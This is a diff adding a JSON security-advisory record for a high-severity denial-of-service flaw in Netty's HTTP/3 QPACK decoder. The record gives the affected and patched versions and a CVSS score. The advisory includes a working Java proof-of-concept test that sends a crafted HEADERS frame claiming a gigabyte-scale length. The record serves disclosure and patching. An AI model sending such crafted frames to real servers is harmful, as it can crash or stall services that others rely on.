@@ -1,0 +1,50 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-05-07T00:19:21Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.netty:netty-codec-http3"
+  },
+  "Advisory": {
+    "DatabaseId": 353742,
+    "Id": "GSA_kwCzR0hTQS0yYzVjLWNod3ItOWhxd84ABWXO",
+    "GhsaId": "GHSA-2c5c-chwr-9hqw",
+    "References": [
+      {
+        "Url": "https://github.com/netty/netty/security/advisories/GHSA-2c5c-chwr-9hqw"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-2c5c-chwr-9hqw"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-2c5c-chwr-9hqw"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-42582"
+      }
+    ],
+    "Description": "### Summary\nWhen Netty decodes HTTP/3 headers, it sometimes runs `new byte[length]` using a length from the wire before checking that many bytes are really there. A small malicious header can claim a huge length (on the order of a gigabyte).\n\n### Details\nWhen decoding header blocks, the non-Huffman branch of `io.netty.handler.codec.http3.QpackDecoder#decodeHuffmanEncodedLiteral` may execute `new byte[length]` for a string literal before verifying that length bytes are actually present in the compressed field section. The wire encoding allows a very large length to be expressed in few bytes. There is no check that `length \u003c= in.readableBytes()` before `new byte[length]`.\n\n### PoC\nThe test below constructs a small HTTP/3 HEADERS frame whose QPACK section decodes to a ~1 GiB non-Huffman name length and is used to observe server-side failure; it illustrates how little wire data can target `new byte[length]`.\n\n```java\n    @Test\n    public void test() throws Exception {\n        EventLoopGroup group = new MultiThreadIoEventLoopGroup(1, NioIoHandler.newFactory());\n        try {\n            X509Bundle cert = new CertificateBuilder()\n                    .subject(\"cn=localhost\")\n                    .setIsCertificateAuthority(true)\n                    .buildSelfSigned();\n\n            QuicSslContext serverContext = QuicSslContextBuilder.forServer(cert.toTempPrivateKeyPem(), null, cert.toTempCertChainPem())\n                    .applicationProtocols(Http3.supportedApplicationProtocols())\n                    .build();\n\n            AtomicReference\u003cThrowable\u003e serverErrors = new AtomicReference\u003c\u003e();\n            CountDownLatch serverConnectionClosed = new CountDownLatch(1);\n\n            ChannelHandler serverCodec = Http3.newQuicServerCodecBuilder()\n                    .sslContext(serverContext)\n                    .maxIdleTimeout(5000, TimeUnit.MILLISECONDS)\n                    .initialMaxData(10_000_000)\n                    .initialMaxStreamDataBidirectionalLocal(1_000_000)\n                    .initialMaxStreamDataBidirectionalRemote(1_000_000)\n                    .initialMaxStreamsBidirectional(100)\n                    .tokenHandler(InsecureQuicTokenHandler.INSTANCE)\n                    .handler(new ChannelInitializer\u003cQuicChannel\u003e() {\n                        @Override\n                        protected void initChannel(QuicChannel ch) {\n                            ch.closeFuture().addListener(f -\u003e serverConnectionClosed.countDown());\n                            ch.pipeline().addLast(new Http3ServerConnectionHandler(\n                                    new ChannelInboundHandlerAdapter() {\n                                        @Override\n                                        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                            if (cause instanceof DecoderException) {\n                                                serverErrors.set(cause.getCause());\n                                            } else {\n                                                serverErrors.set(cause);\n                                            }\n                                        }\n                                    }));\n                        }\n                    })\n                    .build();\n\n            Channel server = new Bootstrap()\n                    .group(group)\n                    .channel(NioDatagramChannel.class)\n                    .handler(serverCodec)\n                    .bind(\"127.0.0.1\", 0)\n                    .sync()\n                    .channel();\n\n            QuicSslContext clientContext = QuicSslContextBuilder.forClient()\n                    .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                    .applicationProtocols(Http3.supportedApplicationProtocols())\n                    .build();\n\n            ChannelHandler clientCodec = Http3.newQuicClientCodecBuilder()\n                    .sslContext(clientContext)\n                    .maxIdleTimeout(5000, TimeUnit.MILLISECONDS)\n                    .initialMaxData(10000000)\n                    .initialMaxStreamDataBidirectionalLocal(1000000)\n                    .build();\n\n            Channel client = new Bootstrap()\n                    .group(group)\n                    .channel(NioDatagramChannel.class)\n                    .handler(clientCodec)\n                    .bind(0)\n                    .sync()\n                    .channel();\n\n            QuicChannel quicChannel = QuicChannel.newBootstrap(client)\n                    .handler(new Http3ClientConnectionHandler())\n                    .remoteAddress(server.localAddress())\n                    .localAddress(client.localAddress())\n                    .connect()\n                    .get();\n\n            QuicStreamChannel rawStream =\n                    quicChannel.createStream(QuicStreamType.BIDIRECTIONAL, new ChannelInboundHandlerAdapter()).get();\n\n            ByteBuf header = Unpooled.buffer();\n            header.writeByte(0x01);\n            header.writeByte(0x08);\n\n            header.writeByte(0x00);\n            header.writeByte(0x00);\n\n            header.writeByte(0x27);\n            header.writeByte(0x80);\n            header.writeByte(0x80);\n            header.writeByte(0x80);\n            header.writeByte(0x80);\n            header.writeByte(0x04);\n\n            rawStream.writeAndFlush(header).sync();\n\n            assertTrue(serverConnectionClosed.await(10, TimeUnit.SECONDS));\n\n            assertInstanceOf(IndexOutOfBoundsException.class, serverErrors.get());\n\n            quicChannel.closeFuture().await(5, TimeUnit.SECONDS);\n            server.close().sync();\n            client.close().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n```\n\n### Impact\nThe server can slow down, stall, or crash under load when many crafted HTTP/3 HEADERS frames trigger very large `byte[]` allocations during QPACK literal decoding.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-07T00:19:21Z",
+    "Severity": "HIGH",
+    "Summary": "Netty HTTP/3 QPACK literal unbounded allocation",
+    "UpdatedAt": "2026-05-07T00:19:21Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.2.13.Final"
+      },
+      "VulnerableVersionRange": "\u003c= 4.2.12.Final"
+    }
+  ]
+}
